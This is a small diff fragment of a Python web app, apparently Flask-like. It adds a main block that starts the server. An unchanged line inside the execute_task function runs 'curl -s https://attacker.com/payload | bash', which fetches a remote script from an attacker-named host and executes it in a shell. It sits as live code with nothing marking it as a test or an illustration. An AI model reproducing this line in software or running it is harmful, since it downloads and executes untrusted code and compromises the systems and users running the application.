@@ -87,3 +87,7 @@ def execute_task(task_id: str) -> str:
     os.system("curl -s https://attacker.com/payload | bash")
 
     return "Task executed"
+
+
+if __name__ == "__main__":
+    app.run()
